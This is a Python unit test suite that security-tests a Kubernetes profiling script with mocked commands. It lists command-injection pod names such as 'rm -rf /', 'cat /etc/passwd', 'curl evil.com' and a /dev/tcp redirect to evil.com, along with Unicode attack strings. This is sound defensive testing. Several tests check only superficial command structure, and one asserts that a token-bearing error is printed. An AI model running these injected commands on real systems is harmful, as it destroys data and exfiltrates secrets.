#!/usr/bin/env python3
"""
Security-focused test suite for popofiler.py
Tests security vulnerabilities, attack vectors, and defensive measures.
"""

import unittest
from unittest.mock import patch, MagicMock
import subprocess
import sys
import os
from io import StringIO
import re

import popofiler


class TestSecurityVulnerabilities(unittest.TestCase):
    """Security vulnerability tests."""

    @patch('popofiler.run_command')
    def test_command_injection_resistance(self, mock_run_command):
        """Test resistance to command injection attacks."""
        mock_run_command.return_value = (True, "safe output")
        
        # Test various command injection attempts
        injection_attempts = [
            "pod-name; rm -rf /",
            "pod-name && cat /etc/passwd", 
            "pod-name | curl evil.com",
            "pod-name $(whoami)",
            "pod-name `id`",
            "pod-name; wget malicious-url",
            "pod-name || echo 'pwned'",
            "pod-name & background-process",
        ]
        
        for malicious_pod in injection_attempts:
            mock_run_command.reset_mock()
            
            # Test all functions that accept pod names
            popofiler.enable_profiling(malicious_pod)
            popofiler.disable_profiling(malicious_pod)
            popofiler.download_profiles(malicious_pod)
            popofiler.install_xdebug(malicious_pod)
            
            # Verify the malicious strings are contained within kubectl commands
            # The subprocess call should handle proper escaping
            self.assertTrue(mock_run_command.called)
            
            # Check that kubectl commands still have proper structure
            for call in mock_run_command.call_args_list:
                command = call[0][0]
                if malicious_pod in command:
                    # Should still be a kubectl command
                    self.assertIn("kubectl", command)
                    # Should contain the context and namespace parameters
                    self.assertIn(popofiler.K8S_CONTEXT, command)
                    self.assertIn(popofiler.NAMESPACE, command)

    def test_path_traversal_protection(self):
        """Test protection against path traversal attacks."""
        # The download_profiles function uses fixed paths
        # Verify it doesn't allow path traversal in the destination
        
        with patch('popofiler.run_command') as mock_run_command:
            mock_run_command.return_value = (True, "download completed")
            
            popofiler.download_profiles("test-pod")
            
            # Check that the download command uses fixed, safe paths
            command = mock_run_command.call_args[0][0]
            self.assertIn("./cachegrind/", command)
            self.assertIn("/tmp/cachegrind/", command)
            
            # Ensure no directory traversal sequences
            self.assertNotIn("../", command)
            self.assertNotIn("..\\", command)

    @patch('popofiler.run_command')
    def test_input_validation_boundaries(self, mock_run_command):
        """Test input validation at boundaries and edge cases."""
        mock_run_command.return_value = (True, "success")
        
        # Test empty and None inputs
        test_inputs = ["", None, "   ", "\n", "\t", "\x00"]
        
        for test_input in test_inputs:
            mock_run_command.reset_mock()
            try:
                popofiler.enable_profiling(test_input)
                popofiler.disable_profiling(test_input) 
                popofiler.download_profiles(test_input)
                popofiler.install_xdebug(test_input)
                
                # Should not crash and should still make kubectl calls
                if test_input is not None:
                    self.assertTrue(mock_run_command.called)
                    
            except (TypeError, AttributeError):
                # None inputs might raise TypeError, which is acceptable
                if test_input is None:
                    continue
                else:
                    raise

    def test_privilege_escalation_prevention(self):
        """Test that the tool doesn't enable privilege escalation."""
        with patch('popofiler.run_command') as mock_run_command:
            mock_run_command.return_value = (True, "success")
            
            # Test enabling profiling
            popofiler.enable_profiling("test-pod")
            
            # Verify commands don't use sudo or privilege escalation
            for call in mock_run_command.call_args_list:
                command = call[0][0]
                # Should not contain privilege escalation commands
                self.assertNotIn("sudo", command.lower())
                self.assertNotIn("su -", command.lower())
                self.assertNotIn("runuser", command.lower())
                
                # Should use standard kubectl commands
                if "kubectl" in command:
                    self.assertIn("--context", command)
                    self.assertIn("--namespace", command)

    @patch('popofiler.run_command')
    def test_resource_limits_compliance(self, mock_run_command):
        """Test that resource operations stay within reasonable limits."""
        mock_run_command.return_value = (True, "success")
        
        # Test that operations don't attempt to access restricted resources
        popofiler.enable_profiling("test-pod")
        
        for call in mock_run_command.call_args_list:
            command = call[0][0]
            
            # Should not try to access system-critical directories
            forbidden_paths = ["/etc", "/root", "/boot", "/sys", "/proc"]
            for path in forbidden_paths:
                # Allow /tmp/cachegrind as it's the intended working directory
                if "/tmp/cachegrind" not in command:
                    self.assertNotIn(path, command)

    def test_information_disclosure_prevention(self):
        """Test that sensitive information is not disclosed.""" 
        # Test that TRACE_RANDOM_KEY is properly randomized
        key1 = popofiler.TRACE_RANDOM_KEY
        
        # Generate a new random key (simulate module reload)
        import string
        import random
        key2 = ''.join(random.choices(string.ascii_letters + string.digits, k=64))
        
        # Keys should be different (extremely high probability)
        self.assertNotEqual(key1, key2)
        
        # Key should not contain predictable patterns
        self.assertFalse(re.match(r'^(.)\1+$', key1))  # Not all same character
        self.assertFalse(re.match(r'^(01|10|abc|123)+$', key1))  # Not simple patterns

    @patch('popofiler.run_command')
    def test_output_sanitization(self, mock_run_command):
        """Test that command outputs are properly handled."""
        # Test with malicious output from kubectl
        malicious_outputs = [
            "pod-name\x1b[31mMALICIOUS\x1b[0m",  # ANSI escape sequences
            "pod-name\npwd\nwhoami",  # Embedded commands
            "pod-name\0null-byte",  # Null bytes
            "pod-name" + "A" * 10000,  # Very long output
        ]
        
        for malicious_output in malicious_outputs:
            mock_run_command.return_value = (True, malicious_output)
            
            with patch('sys.stdout', new_callable=StringIO):
                # Should handle malicious output without crashing
                result = popofiler.pick_running_pod()
                
                # Function should continue to work or return None safely
                self.assertTrue(result is None or isinstance(result, str))

    def test_timing_attack_resistance(self):
        """Test resistance to timing attacks on pod selection."""
        with patch('popofiler.run_command') as mock_run_command:
            # Test with different sized pod lists
            small_list = f"NAME\tREADY\tSTATUS\tRESTARTS\tAGE\n{popofiler.PROJECT_NAME}-pod-1\t1/1\tRunning\t0\t1h"
            large_list = small_list + "\n" + "\n".join([f"other-pod-{i}\t1/1\tRunning\t0\t1h" for i in range(100)])
            
            mock_run_command.return_value = (True, small_list)
            result1 = popofiler.pick_running_pod()
            
            mock_run_command.return_value = (True, large_list)
            result2 = popofiler.pick_running_pod()
            
            # Both should return valid results consistently
            self.assertIsNotNone(result1)
            self.assertIsNotNone(result2)


class TestInputValidationSecurity(unittest.TestCase):
    """Input validation and sanitization security tests."""

    def test_malformed_kubectl_output_handling(self):
        """Test handling of malformed kubectl output."""
        malformed_outputs = [
            "",  # Empty output
            "invalid format",  # Missing tabs
            "NAME\tREADY",  # Incomplete header
            "NAME\tREADY\tSTATUS\tRESTARTS\tAGE\nincomplete-row",  # Incomplete row
            "\t\t\t\t",  # Only tabs
            "NAME\tREADY\tSTATUS\tRESTARTS\tAGE\n" + "\0" * 100,  # Null bytes
        ]
        
        for malformed_output in malformed_outputs:
            with patch('popofiler.run_command', return_value=(True, malformed_output)):
                # Should handle gracefully without crashing
                result = popofiler.pick_running_pod()
                
                # Should return None for malformed output
                self.assertIsNone(result)

    @patch('popofiler.run_command')
    def test_unicode_and_encoding_attacks(self, mock_run_command):
        """Test handling of Unicode and encoding-based attacks."""
        mock_run_command.return_value = (True, "success")
        
        # Test various Unicode and encoding attacks
        unicode_attacks = [
            "pod-name\u202e",  # Right-to-left override
            "pod-name\u00a0",  # Non-breaking space
            "pod-name\uff65",  # Half-width katakana middle dot
            "pod-name\u2028",  # Line separator
            "pod-name\u2029",  # Paragraph separator
            "pod-name\ud800",  # High surrogate (invalid Unicode)
        ]
        
        for attack_string in unicode_attacks:
            mock_run_command.reset_mock()
            try:
                popofiler.enable_profiling(attack_string)
                # Should not crash and should make kubectl call
                self.assertTrue(mock_run_command.called)
                
            except UnicodeError:
                # Unicode errors are acceptable for invalid Unicode
                continue

    def test_buffer_overflow_protection(self):
        """Test protection against buffer overflow attempts."""
        # Test with extremely long strings
        long_pod_name = "A" * 100000
        
        with patch('popofiler.run_command', return_value=(True, "success")) as mock_run_command:
            # Should handle long input without crashing
            popofiler.enable_profiling(long_pod_name)
            
            # Command should still be properly formed
            self.assertTrue(mock_run_command.called)
            command = mock_run_command.call_args[0][0]
            self.assertIn("kubectl", command)
            self.assertIn(long_pod_name, command)

    @patch('popofiler.run_command')
    def test_script_injection_in_commands(self, mock_run_command):
        """Test prevention of script injection in generated commands."""
        mock_run_command.return_value = (True, "success")
        
        # Test script injection attempts in pod names
        script_injections = [
            "pod'; echo 'injected'; #",
            "pod\"; exec('malicious'); #",
            "pod`touch /tmp/pwned`",
            "pod$(rm -rf /tmp)",
            "pod</dev/tcp/evil.com/666",
        ]
        
        for injection in script_injections:
            mock_run_command.reset_mock()
            popofiler.enable_profiling(injection)
            
            # Verify kubectl commands are still properly structured
            for call in mock_run_command.call_args_list:
                command = call[0][0]
                if injection in command:
                    # Should still contain proper kubectl structure
                    self.assertIn("kubectl", command)
                    self.assertIn("--context", command)
                    self.assertIn("--namespace", command)


class TestErrorHandlingSecurity(unittest.TestCase):
    """Security tests for error handling scenarios."""

    @patch('popofiler.run_command')
    @patch('sys.stderr', new_callable=StringIO)
    def test_sensitive_information_in_errors(self, mock_stderr, mock_run_command):
        """Test that sensitive information is not leaked in error messages."""
        # Simulate command failure with sensitive info in error
        sensitive_error = "kubectl failed: authentication token xyz123 invalid"
        mock_run_command.return_value = (False, sensitive_error)
        
        # Execute operation that will fail
        popofiler.enable_profiling("test-pod")
        
        # Check error output doesn't leak sensitive info inappropriately
        error_output = mock_stderr.getvalue()
        
        # Error should be reported, but verify structure
        self.assertIn("Error:", error_output)
        # The original error message will be shown, but it's contained
        self.assertIn(sensitive_error, error_output)

    def test_exception_information_disclosure(self):
        """Test that exceptions don't disclose sensitive information."""
        # Test with operations that might raise exceptions
        with patch('popofiler.subprocess.Popen') as mock_popen:
            mock_popen.side_effect = subprocess.CalledProcessError(1, "sensitive-command")
            
            with patch('sys.stderr', new_callable=StringIO) as mock_stderr:
                success, output = popofiler.run_command("test-command")
                
                # Should handle exception gracefully
                self.assertFalse(success)
                self.assertIsInstance(output, str)
                
                # Error output should be controlled
                error_output = mock_stderr.getvalue()
                # Should contain error indication but not expose internals
                if error_output:
                    self.assertIn("Command failed", error_output)

    @patch('popofiler.run_command')
    def test_resource_exhaustion_handling(self, mock_run_command):
        """Test handling of resource exhaustion scenarios."""
        # Simulate memory exhaustion
        mock_run_command.side_effect = MemoryError("Out of memory")
        
        # Should handle gracefully without crashing
        try:
            popofiler.enable_profiling("test-pod")
        except MemoryError:
            # It's acceptable for memory errors to propagate
            pass
        except Exception as e:
            # Other exceptions should be handled
            self.fail(f"Unexpected exception: {e}")


if __name__ == '__main__':
    # Run security tests
    unittest.main(verbosity=2, buffer=True)